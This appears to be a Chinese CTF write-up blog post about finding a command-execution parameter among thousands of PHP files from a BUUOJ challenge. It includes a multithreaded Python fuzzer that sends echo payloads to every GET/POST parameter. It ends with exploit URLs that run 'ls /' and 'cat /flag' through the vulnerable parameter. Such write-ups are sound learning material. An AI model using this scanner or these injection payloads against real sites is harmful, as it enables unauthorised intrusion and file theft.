---
layout: post
title:  "2019-11-14-01"
description: 将两件熟悉却无相关的事物刻意联系到一起，可以加强冲突场景的记忆;将一件熟悉和一件陌生的事物联系到一起，可以加强对陌生事物的记忆
date:   2019-11-14
tags: python php 命令执行
excerpt_separator: ~~~
---
1.python脚本多线程和一次提交多个payload  

2.本地搭php环境测试  

3.eval和system用法(echo是linux命令,不是php命令),system()命令执行漏洞,通过get的方法传递参数

~~~  
## Ready
页面有提示www.tar.gz ,此为文件格式,应该是添加在url路径后面将该文件下载下来.下载下来后发现有3000份左右的php文件,随便打开几个文件查看,发现里面有很多$_GET['...'],$_POST['...'],assert,eval,system之类的

![My helpful screenshot](/assets/img/2019-11-14-01/2019-11-14 (5).png)

判断这里的文件中有一个文件里面的某个参数存在命令执行/代码执行漏洞(shell),类似eval($_GET[xx]) 或者 system($_GET[xx]),于是用了一个大佬写的脚本(已修改)

(测试了很多脚本,该脚本效率最高,且很准确,适合给以后做参考)
```python
import os
import requests
import re
import threading
import time
print('开始时间：  '+  time.asctime( time.localtime(time.time()) ))
s1=threading.Semaphore(100)                                         #这儿设置最大的线程数
filePath = r"E:/test/src/"
os.chdir(filePath)                                                  #改变当前的路径
requests.adapters.DEFAULT_RETRIES = 5                               #设置重连次数，防止线程数过高，断开连接
files = os.listdir(filePath)
print(len(files))#M
session = requests.Session()
session.keep_alive = False                                           # 设置连接活跃状态为False
def get_content(file):
    s1.acquire()                                                
    print('trying   '+file+ '     '+ time.asctime( time.localtime(time.time()) ))
    with open(file,encoding='utf-8') as f:                          #打开php文件，提取所有的$_GET和$_POST的参数
            gets = list(re.findall('\$_GET\[\'(.*?)\'\]', f.read()))
            posts = list(re.findall('\$_POST\[\'(.*?)\'\]', f.read()))
    data = {}                                                       #所有的$_POST
    params = {}                                                     #所有的$_GET
    for m in gets:
        params[m] = "echo 'xxxxxx';"
    for n in posts:
        data[n] = "echo 'xxxxxx';"
    url = 'http://localhost:801/dashboard/src/'+file
    try:
        req = session.post(url, data=data, params=params)           #一次性请求所有的GET和POST
        req.close()                                             # 关闭请求  释放内存
        req.encoding = 'utf-8'
        content = req.text
        #print(content)
        if "xxxxxx" in content:                                 #如果发现有可以利用的参数，继续筛选出具体的参数
            # a = 0
            # b = 0
            flag = 0
            for a in gets:
                req = session.get(url+'?%s='%a+"echo 'xxxxxx';")
                content = req.text
                req.close()                                             # 关闭请求  释放内存
                if "xxxxxx" in content:
                    flag = 1
                    param = a#M
                    break
            if flag != 1:
                for b in posts:
                    req = session.post(url, data={b:"echo 'xxxxxx';"})
                    content = req.text
                    req.close()                                             # 关闭请求  释放内存
                    if "xxxxxx" in content:
                        param = b#M
                        break
            # if flag == 1:                                                   #flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，
            #     param = a
            # else:
            #     param = b
            print('找到了利用文件： '+file+"  and 找到了利用的参数：%s" %param)
            print('结束时间：  ' + time.asctime(time.localtime(time.time())))
    except requests.exceptions.ConnectionError:#M
        print("连接错误")#M
    s1.release()

for i in files:                                                         #加入多线程
   t = threading.Thread(target=get_content, args=(i,))
   t.start()
```
通过检测返回的页面是否有'xxxxxx'(如果存在代码执行/命令执行漏洞,echo 'xxxxxx';这条命令将被执行)  

!!!!但!!!!  

不要直接对目标网站一直提交数据,会容易崩溃,进而导致无法检测出正确的文件及参数
经别人writeup提醒,在本地搭建php环境测试(直接把测试目录src丢入dashboard目录就行).于是准确测出了结果

![My helpful screenshot](/assets/img/2019-11-14-01/2019-11-14 (9).png)

![My helpful screenshot](/assets/img/2019-11-14-01/2019-11-14 (7).png)

(经测试,无论是system()还是eval(),如果存在漏洞,echo 'xxxxxx';都能返回相应内容)

![My helpful screenshot](/assets/img/2019-11-14-01/2019-11-14 (8).png)

构造参数执行"ls /"命令 
``` 
http://df3acaa2-1ce6-48b1-8126-cf67d8c4a8be.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=ls%20/
```
![My helpful screenshot](/assets/img/2019-11-14-01/2019-11-14 (10).png)

构造参数执行"cat /flag"命令 
``` 
http://df3acaa2-1ce6-48b1-8126-cf67d8c4a8be.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag
```
![My helpful screenshot](/assets/img/2019-11-14-01/2019-11-14 (12).png)

## 知识点:
1.python脚本多线程和一次提交多个payload  

2.本地搭php环境测试  

3.eval和system用法(echo是linux命令,不是php命令),system()命令执行漏洞,通过get的方法传递参数